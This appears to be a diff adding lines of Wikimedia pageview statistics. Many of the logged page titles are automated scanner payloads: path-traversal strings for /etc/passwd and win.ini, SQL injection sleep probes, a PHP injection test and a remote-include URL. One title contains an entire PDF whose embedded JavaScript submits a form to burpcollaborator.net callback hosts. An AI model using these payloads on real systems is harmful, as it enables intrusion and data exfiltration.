@@ -1,0 +1,119 @@
+en.wikipedia Talk:H:IPA null desktop 2 J2
+en.wikipedia %25D0%25A1%25D0%25BF%25D0%25B5%25D1%2586%25D1%2596%25D0%25B0%25D0%25BB%25D1%258C%25D0%25BD%25D0%25B0:%25D0%259F%25D0%25BE%25D1%2588%25D1%2583%25D0%25BA desktop 1 L1
+en.wikipedia %25D8%25AE%25D8%25A7%25D8%25B5:%25D8%25A8%25D8%25AD%25D8%25AB desktop 2 I1M1
+en.wikipedia %s 1578140 desktop 598 A26B20C25D14E24F18G10H9I18J13K18L17M17N22O25P31Q53R40S30T24U35V28W47X34
+pt.wikipedia A.A.S.A_
+ mobile-app 1 N1
+pt.wikipedia A.C 226 desktop 1 R1
+pt.wikipedia Fazer_um_amigo_é_um_dom!
+Ter_um_amigo_é_uma_graça!
+Conservar_um_amigo_é_uma_virtude!
+Mas,_ter_um(a)_amigo(a)_como_vocês,_falo_sério...
+É_uma_honra_!!!!! mobile-app 1 I1
+pt.wikipedia Fazes-Me_Falta 3352849 desktop 1 T1
+vi.wikipedia file:///etc/passwd 289709 mobile-web 1 E1
+vi.wikipedia file:///etc/passwd 414610 mobile-web 1 E1
+vi.wikipedia iQ8y25Rw';select_pg_sleep(12);_--_ mobile-web 1 D1
+vi.wikipedia ibszimHV mobile-web 1 I1
+vi.wikipedia if(now()=sysdate(),sleep(10),0)/*'XOR(if(now()=sysdate(),sleep(10),0))OR'"XOR(if(now()=sysdate(),sleep(10),0))OR"*/ mobile-web 1 E1
+vi.wikipedia index.php/. 528455 mobile-web 1 E1
+vi.wikipedia unexisting/../../../../../../../../../../windows/win.ini.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\ 289709 mobile-web 1 E1
+vi.wikipedia Đặc_biệt:Nguồn_sách/0-)))))))))))))))))))))))))))))))))))))))))))))))))))))))))))))))))))))-380202-X mobile-web 1 F1
+vi.wikipedia Đặc_biệt:Nguồn_sách/0-13-';print(md5(acunetix_wvs_security_test));$a='-X mobile-web 1 F1
+vi.wikipedia Đặc_biệt:Nguồn_sách/0-198-53907-.\\./.\\./.\\./.\\./.\\./.\\./etc/passwd mobile-web 1 F1
+vi.wikiquote ................windowswin.ini desktop 18 D4G4I10
+vi.wikiquote ../.../.././../.../.././../.../.././../.../.././../.../.././../.../.././etc/passwd 1 desktop 10 D1F9
+vi.wikiquote ../../../../../../../../../../boot.ini 1 desktop 10 D1F9
+vi.wikiquote 1'" desktop 18 D4G4J10
+vi.wikiquote 12345'"\'\");|]*�{
+<�>�''💩 1 desktop 10 D1E9
+vi.wikiquote 12345'"\'\");|]*�{
+vi.wikiquote 149GVcrc 1836 desktop 1 E1
+vi.wikisource Http://testasp.vulnweb.com/t/fit.txt 21456 desktop 2 E1G1
+vi.wikivoyage <!-- 1756 desktop 1 I1
+zh.wikipedia �
+w��(� 3597889 desktop 1 W1
+en.wikipedia Segment
+
+ mobile-app 1 V1
+en.wikipedia %PDF-1.3
+
+1_0_obj
+<</Type/Pages/Count_1/Kids[5_0_R]>>
+endobj
+
+2_0_obj
+<</Type/Catalog/OpenAction_9_0_R/Pages_1_0_R>>
+endobj
+
+3_0_obj
+<</Length_112>>
+stream
+1_0_0_-1_0_792_cm
+q
+1_0_0_-1_0_792_cm
+BT
+220_400_Td
+/F1_10_Tf
+(For_further_information_please_click_here)_Tj
+ET
+endstream
+endobj
+
+4_0_obj
+<</ProcSet[/PDF/Text/ImageB/ImageC/ImageI]/Font<</F1_6_0_R>>>>
+endobj
+
+5_0_obj
+<</Type/Page/Parent_1_0_R/MediaBox[0_0_612_792]/Contents_3_0_R/Resources_4_0_R/Annots[8_0_R]>>
+endobj
+
+6_0_obj
+<</Type/Font/BaseFont/Helvetica/Subtype/Type1/Encoding/WinAnsiEncoding>>
+endobj
+
+7_0_obj
+<</S/URI/URI_10_0_R>>
+endobj
+
+8_0_obj
+<</Subtype/Link/A_7_0_R/Type/Annot/Rect[0_0_889_792]/Border[0_0_0]>>
+endobj
+
+9_0_obj
+<<
+/S/JavaScript/JS(
+	if\(this.submitForm\){
+		this.submitForm\('http://sjfyltsecrbmoaakmus5x674fvlnij6b3zummab.burpcollaborator.net'\);
+		app.alert\("Script_executed"\);
+	}
+)
+/Next<</F<</F_10_0_R/FS/URL>>/S/SubmitForm>>
+>>
+endobj
+
+10_0_obj
+(http://b2eh4cbxvau57tt35dbogpqnye4612pvpjg68ux.burpcollaborator.net)
+endobj
+
+xref
+0_11
+0000000000_65536_f
+0000000010_00000_n
+0000000062_00000_n
+0000000125_00000_n
+0000000286_00000_n
+0000000365_00000_n
+0000000476_00000_n
+0000000565_00000_n
+0000000603_00000_n
+0000000688_00000_n
+0000000928_00000_n
+
+trailer
+<</Size_11/Root_2_0_R>>
+
+startxref
+1015
+%%EOF desktop 1 Q1
+en.wikipedia %SystemRoot% 349504 desktop 2 F1X1
